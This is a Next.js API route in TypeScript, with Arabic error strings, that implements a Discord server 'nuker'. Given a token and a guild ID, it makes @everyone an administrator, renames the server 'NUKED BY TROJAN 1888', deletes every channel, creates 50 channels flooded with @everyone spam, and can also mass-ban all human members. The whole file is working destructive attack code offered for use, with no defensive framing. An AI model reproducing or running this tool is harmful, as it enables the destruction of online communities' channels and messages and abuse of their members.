import { NextRequest, NextResponse } from 'next/server'

const DISCORD_API = 'https://discord.com/api/v10'

async function discordRequest(method: string, endpoint: string, token: string, body?: object) {
  try {
    const res = await fetch(`${DISCORD_API}/${endpoint}`, {
      method,
      headers: { 'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'TRJ-Bot/1.0' },
      body: body ? JSON.stringify(body) : undefined
    })
    if (res.status === 204) return { data: {}, status: 204 }
    const data = await res.json().catch(() => null)
    return { data, status: res.status }
  } catch { return { data: null, status: 0 } }
}

export async function POST(request: NextRequest) {
  try {
    const { token, guildId, action } = await request.json()
    if (!token || !guildId || !action) return NextResponse.json({ success: false, error: 'بيانات ناقصة' }, { status: 400 })

    const stats = { deleted: 0, created: 0, spam_sent: 0, banned: 0 }

    if (action === 'nuke') {
      const { data: roles } = await discordRequest('GET', `guilds/${guildId}/roles`, token)
      if (roles && Array.isArray(roles)) {
        const everyone = roles.find((r: {name: string}) => r.name === '@everyone')
        if (everyone) await discordRequest('PATCH', `guilds/${guildId}/roles/${(everyone as {id: string}).id}`, token, { permissions: '8' })
      }
      await discordRequest('PATCH', `guilds/${guildId}`, token, { name: 'NUKED BY TROJAN 1888' })

      const { data: channels } = await discordRequest('GET', `guilds/${guildId}/channels`, token)
      if (channels && Array.isArray(channels)) {
        for (const ch of channels) {
          const deleted = await discordRequest('DELETE', `channels/${(ch as {id: string}).id}`, token)
          if (deleted.status === 200 || deleted.status === 204) stats.deleted++
        }
      }

      const names = ['nuked-by-trojan', 'by-trojan', 'ez-1888', 'trojan-was-here']
      for (let i = 0; i < 50; i++) {
        const { data: newCh } = await discordRequest('POST', `guilds/${guildId}/channels`, token, { name: names[i % names.length], type: 0 })
        if (newCh && (newCh as {id?: string}).id) {
          stats.created++
          for (let j = 0; j < 10; j++) {
            const r = await discordRequest('POST', `channels/${(newCh as {id: string}).id}/messages`, token, { content: '@everyone **TROJAN WAS HERE**' })
            if (r.status === 200) stats.spam_sent++
          }
        }
      }
    } else if (action === 'banall') {
      const { data: members } = await discordRequest('GET', `guilds/${guildId}/members?limit=1000`, token)
      if (members && Array.isArray(members)) {
        for (const m of members) {
          const md = m as {user?: {id?: string; bot?: boolean}}
          if (md.user?.bot) continue
          const r = await discordRequest('PUT', `guilds/${guildId}/bans/${md.user?.id}`, token, { delete_message_days: 7 })
          if (r.status === 200 || r.status === 204 || r.status === 201) stats.banned++
        }
      }
    } else if (action === 'delete_channels') {
      const { data: channels } = await discordRequest('GET', `guilds/${guildId}/channels`, token)
      if (channels && Array.isArray(channels)) {
        for (const ch of channels) {
          const r = await discordRequest('DELETE', `channels/${(ch as {id: string}).id}`, token)
          if (r.status === 200 || r.status === 204) stats.deleted++
        }
      }
    } else if (action === 'spam') {
      const { data: channels } = await discordRequest('GET', `guilds/${guildId}/channels`, token)
      if (channels && Array.isArray(channels)) {
        for (const ch of channels) {
          if ((ch as {type: number}).type === 0) {
            for (let i = 0; i < 20; i++) {
              const r = await discordRequest('POST', `channels/${(ch as {id: string}).id}/messages`, token, { content: '@everyone **TROJAN WAS HERE**' })
              if (r.status === 200) stats.spam_sent++
            }
          }
        }
      }
    }

    return NextResponse.json({ success: true, stats })
  } catch { return NextResponse.json({ success: false, error: 'خطأ في الخادم' }, { status: 500 }) }
}
